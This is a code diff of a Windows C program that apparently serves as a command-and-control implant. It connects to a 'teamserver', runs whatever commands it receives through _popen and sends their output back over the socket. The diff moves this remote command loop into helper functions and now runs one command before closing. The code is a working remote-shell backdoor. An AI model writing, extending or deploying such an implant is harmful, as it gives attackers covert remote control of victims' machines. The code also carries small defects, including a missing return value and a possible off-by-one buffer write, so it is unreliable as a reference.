@@ -4,7 +4,47 @@
 #include <winsock2.h>
 #include <windows.h>
 
+
 #pragma comment(lib, "ws2_32.lib")
+
+int executeCommands(char *command, int s)
+{
+    char output[1024];
+
+        FILE *f = _popen(command, "r");
+        if(f == NULL)
+        {
+            return 1;
+        }
+         while(fgets(output, sizeof(output), f) != 0)
+         {
+            send(s,output, strlen(output), 0);
+         }
+         _pclose(f);
+         send(s, "END_OF_OUTPUT\n", 14, 0);
+         return 0;
+}
+
+int receiveCommands(int s)
+{
+    int recv_commands;
+    char command[1024];
+
+    recv_commands = recv(s, command, sizeof(command), 0);
+        if(recv_commands == SOCKET_ERROR)
+        {
+            printf("[-] Error receiving commands: %d", WSAGetLastError());
+            return 1;
+        } 
+
+        if(recv_commands == 0) { //return value of recv when connection cloesse
+            printf("[-] Server disconnected\n");
+            return 0;
+        }
+
+        command[recv_commands] = '\0';
+        executeCommands(command,s);
+}
 
 
 
@@ -13,9 +53,6 @@ int main()
     WSADATA wsa;
     SOCKET s;
     struct sockaddr_in server;
-    int recv_commands;
-    char command[1024];
-    char output[1024];
     
     if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
     {
@@ -42,37 +79,9 @@ int main()
 
     printf("Connected to teamserver");
 
-    while(1)
-    {
-        recv_commands = recv(s, command, sizeof(command), 0);
-        if(recv_commands == SOCKET_ERROR)
-        {
-            printf("[-] Error receiving commands: %d", WSAGetLastError());
-            return 1;
-        } 
-
-        if(recv_commands == 0) { //return value of recv when connection cloesse
-            printf("[-] Server disconnected\n");
-            return 0;
-        }
-
-        command[recv_commands] = '\0';
-        FILE *f = _popen(command, "r");
-        if(f == NULL)
-        {
-            return 1;
-        }
-         while(fgets(output, sizeof(output), f) != 0)
-         {
-            printf("[DEBUG] Sending: %s", output);
-            send(s,output, strlen(output), 0);
-         }
-         _pclose(f);
-         send(s, "END_OF_OUTPUT\n", 14, 0);
-
-    }
-
-
-
+    receiveCommands(s);
+    Sleep(2000);
+    closesocket(s);
+    WSACleanup();
     return 0;
 }
